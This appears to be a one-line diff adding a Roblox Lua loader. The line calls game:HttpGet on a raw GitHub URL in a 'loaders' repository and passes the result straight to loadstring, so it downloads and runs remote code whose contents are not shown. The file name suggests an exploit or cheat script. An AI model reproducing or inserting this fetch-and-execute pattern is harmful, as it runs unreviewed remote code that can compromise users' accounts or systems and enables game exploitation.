@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/wanted-update-spam7-mnzm0hutn5wwc9.lua"))()
